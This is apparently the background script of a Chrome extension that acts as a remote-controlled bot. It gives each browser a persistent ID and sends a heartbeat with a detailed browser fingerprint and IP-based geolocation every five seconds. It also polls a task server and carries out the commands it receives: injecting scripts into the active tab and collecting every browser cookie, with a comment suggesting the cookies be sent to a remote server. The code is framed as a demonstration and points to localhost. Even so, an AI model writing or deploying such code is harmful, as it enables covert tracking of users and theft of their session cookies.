// Function to get or create a unique UUID for this device
function getUUID() {
  return new Promise((resolve) => {
    chrome.storage.local.get(['uuid'], (result) => {
      if (result.uuid) {
        resolve(result.uuid);
      } else {
        const newUUID = generateUUID();
        chrome.storage.local.set({ uuid: newUUID }, () => {
          resolve(newUUID);
        });
      }
    });
  });
}

// Generate a new UUID (simple implementation, consider using a library for real-world apps)
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = (Math.random() * 16) | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// Fetch current tasks from the server and check for the device's UUID in each task
function fetchCurrentTasks() {
  getUUID().then((uuid) => {
    fetch('http://localhost:8000/prompts')
      .then((response) => response.json())
      .then((tasks) => {
        console.log('Fetched tasks:', tasks);
        tasks.forEach((task) => {
          if (task.devices.includes(uuid)) {
            // Device UUID matches, check if the task is in completedDevices
            const completedDevices = task.completedDevices || [];
            const isDeviceCompleted = completedDevices.some((device) => device.uuid === uuid);

            if (!isDeviceCompleted) {
              // This device has not yet completed the task, so execute the task
              handleTask(task);
            }
          }
        });
      })
      .catch((error) => {
        console.error('Error fetching tasks:', error);
      });
  });
}

// Handle task based on the prompt
function handleTask(task) {
  const { id, prompt } = task;

  console.log(`Handling task: ${prompt} (Task ID: ${id})`);

  // Example of task handling based on the prompt (e.g., execute remote script, get cookies, etc.)
  switch (prompt) {
    case 'executes remote script':
      executeRemoteScript();
      break;
    case 'getAllCookies':
      getAllCookies();
      break;
    case 'consolePrint':
      consolePrint(task);
      break;
    default:
      console.log('Unknown task prompt:', prompt);
  }
}

// Handler for executing remote script (for demonstration purposes)
function executeRemoteScript() {
  console.log("Executing remote script...");
  // Insert actual script execution logic here (e.g., evaluating code in content.js)
  // For example, you could send a message to content.js to execute code in the context of a page
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const activeTabId = tabs[0].id;
    chrome.scripting.executeScript({
      target: { tabId: activeTabId },
      func: remoteScriptFunction,
    });
  });
}

// Example remote script function (for demonstration purposes)
function remoteScriptFunction() {
  console.log("Remote script executed in the page context!");
  // You can modify this function to execute any JavaScript code in the current tab.
}

// Handler for getting all cookies
function getAllCookies() {
  chrome.cookies.getAll({}, (cookies) => {
    console.log("All cookies:", cookies);
    // Optionally, you could send cookies to a remote server or save them locally
    chrome.storage.local.set({ cookies: cookies }, () => {
      console.log("Cookies stored in chrome.storage.local");
    });
  });
}

// Handler for printing to console (you can customize this further)
function consolePrint(task) {
  console.log(`Console print for task ID ${task.id}: ${task.prompt}`);
}

// Periodically fetch tasks from the server every 20 seconds
setInterval(fetchCurrentTasks, 20000);  // Fetch tasks every 20 seconds

async function sendHeartbeat() {
  try {
    const uuid = await getUUID();
    const browserDetails = await getBrowserDetails();  // Await browser details

    const response = await fetch('http://localhost:8000/ping', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ uuid, browserDetails }),
    });

    const data = await response.json();
    console.log('Ping response:', data);
  } catch (error) {
    console.error('Error sending ping:', error);
  }
}

setInterval(sendHeartbeat, 5000);  // Send heartbeat every 5 seconds


async function getBrowserDetails() {
  const details = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    appName: navigator.appName,
    appVersion: navigator.appVersion,
    vendor: navigator.vendor,
    product: navigator.product,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    geolocation: null // Initialize as null to populate later
  };

  // Fetch approx geolocation
  try {
    const response = await fetch('https://geolocation-db.com/json/');
    const data = await response.json();

    if (data.latitude && data.longitude) {
      details.geolocation = { latitude: data.latitude, longitude: data.longitude, ...data };
    } else {
      details.geolocation = { error: "Unable to fetch geolocation from external API" };
    }
  } catch (error) {
    details.geolocation = { error: "Geolocation not supported or failed to fetch from API" };
  }

  // CPU Information
  details.cpu = {
    cores: navigator.hardwareConcurrency || "Unknown",
    model: "Not available in the browser"
  };

  // Memory Information
  details.memory = {
    total: navigator.deviceMemory || "Unknown",
    available: "Not available"
  };

  return details;
}




// Listener for messages from content.js
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'sendPromptCompletion') {
      const { promptId, body } = message;
      const { uuid, consoleOutput } = body;
      
      console.log(`Task ${promptId} completed!`);
      console.log(`Device UUID: ${uuid}`);
      console.log(`Console Output: ${consoleOutput.message}`);
      localStorage.setItem(`task-${promptId}-completion`, JSON.stringify({ uuid, consoleOutput }));

      sendResponse({ status: 'success', message: 'Task completion received' });
  }
});

